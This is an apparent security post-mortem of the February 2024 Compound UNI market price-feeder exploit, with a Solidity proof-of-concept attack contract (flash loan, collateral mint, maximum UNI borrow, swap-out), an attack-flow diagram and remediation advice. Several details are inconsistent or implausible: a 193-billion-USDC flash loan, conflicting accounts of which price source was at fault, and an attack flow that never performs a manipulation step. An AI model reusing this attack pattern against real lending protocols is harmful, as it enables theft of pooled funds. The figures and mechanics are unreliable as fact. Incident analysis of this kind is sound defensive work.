# Compound/UNI — Price Feeder Manipulation via Incomplete Liquidation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02-13 |
| **Protocol** | Compound (UNI Market) |
| **Chain** | Ethereum |
| **Loss** | ~$439,537 |
| **Attacker** | [0xe000008459](https://etherscan.io/address/0xe000008459b74a91e306a47c808061dfa372000e) |
| **Attack Contract** | [0x2f99fb66](https://etherscan.io/address/0x2f99fb66ea797e7fa2d07262402ab38bd5e53b12) |
| **Vulnerable Contract** | [Price Feeder 0x50ce56A3](https://etherscan.io/address/0x50ce56A3239671Ab62f185704Caedf626352741e) |
| **Root Cause** | Compound's UNI market price feeder referenced Balancer AMM spot prices, making it manipulable via large single-block swaps — excessive UNI borrowing followed by incomplete liquidation resulted in bad debt |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/CompoundUni_exp.sol) |

---

## 1. Vulnerability Overview

Compound's UNI market price feeder was implemented in a manipulable manner. The attacker flash-borrowed 193B USDC to mint cUSDC, manipulated the oracle price, and borrowed the maximum amount of UNI. The resulting position — borrowed beyond the liquidation threshold — was never fully liquidated, leaving bad debt in the protocol.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: spot price-based price feeder
function getUnderlyingPrice(CToken cToken) external view returns (uint256) {
    // Uniswap/Chainlink spot price — manipulable via large flash loans
    return priceFeed.latestAnswer() * 1e10; // 8 decimals → 18 decimals
}

// ✅ Safe code: Chainlink + TWAP dual validation
function getUnderlyingPrice(CToken cToken) external view returns (uint256) {
    uint256 chainlinkPrice = getChainlinkPrice(cToken);
    uint256 twapPrice = getTWAPPrice(cToken, 1800);
    // Revert if deviation between the two prices exceeds 5%
    require(
        abs(chainlinkPrice - twapPrice) * 100 / chainlinkPrice <= 5,
        "price deviation too high"
    );
    return chainlinkPrice;
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: UniswapAnchoredView.sol
    function price(string calldata symbol) external view returns (uint256) {  // ❌ Vulnerability
        TokenConfig memory config = getTokenConfigBySymbol(symbol);
        return priceInternal(config);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Balancer flash: 193B USDC flash loan
  │
  ├─→ [2] USDC → cUSDC mint (Compound collateral deposit)
  │
  ├─→ [3] Compound markets enterMarkets
  │
  ├─→ [4] getAccountLiquidity() query
  │
  ├─→ [5] Price feeder getUnderlyingPrice() call (manipulated price)
  │
  ├─→ [6] Maximum UNI borrow
  │
  ├─→ [7] UNI → WETH (Uniswap V3)
  │   └─→ WETH → USDC (Uniswap V3)
  │
  ├─→ [8] Flash loan repayment
  │
  └─→ [9] ~$439K profit + Compound bad debt created
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ICompound {
    function mint(uint256 mintAmount) external returns (uint256);
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
    function getUnderlyingPrice(address cToken) external view returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
}

contract AttackContract {
    ICompound constant cUSDC = ICompound(0x39AA39c021dfbaE8faC545936693aC917d5E7563);

    function receiveFlashLoan(
        IERC20[] memory, uint256[] memory amounts,
        uint256[] memory, bytes memory
    ) external {
        // [1] 193B USDC → cUSDC mint
        USDC.approve(address(cUSDC), amounts[0]);
        cUSDC.mint(amounts[0]);

        // [2] Enter Compound markets
        address[] memory markets = new address[](1);
        markets[0] = address(cUSDC);
        Comptroller(comptroller).enterMarkets(markets);

        // [3] Borrow maximum UNI using manipulated price
        (, uint256 liquidity,) = Comptroller(comptroller).getAccountLiquidity(address(this));
        uint256 uniPrice = priceFeed.getUnderlyingPrice(cUNI);
        uint256 maxBorrow = liquidity * 1e18 / uniPrice;
        cUNI.borrow(maxBorrow);

        // [4] Swap UNI → WETH → USDC
        swapUNIToWETHToUSDC(maxBorrow);

        // [5] Repay flash loan
        USDC.transfer(balancer, amounts[0]);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Price Oracle Manipulation |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **Attack Vector** | External (large flash loan) |
| **DApp Category** | Compound lending protocol |
| **Impact** | Excessive borrowing + protocol bad debt |

## 6. Remediation Recommendations

1. **Dual oracle validation**: Compare Chainlink and TWAP price sources and enforce deviation limits
2. **Block same-TX borrow after large collateral mint**: Detect and block the pattern of minting large collateral followed by immediate borrowing within the same transaction
3. **Maximum borrow cap**: Limit the maximum borrow amount per account per transaction
4. **Liquidation bot immediate response**: Cover incomplete liquidations immediately using protocol insurance funds

## 7. Lessons Learned

- A 193B USDC flash loan was previously infeasible but became possible due to Balancer's deep liquidity.
- The combination of price feeder manipulation and incomplete liquidation leaves permanent bad debt in the protocol.
- Compound V2 forks must immediately apply upstream patches addressing price feeder vulnerabilities.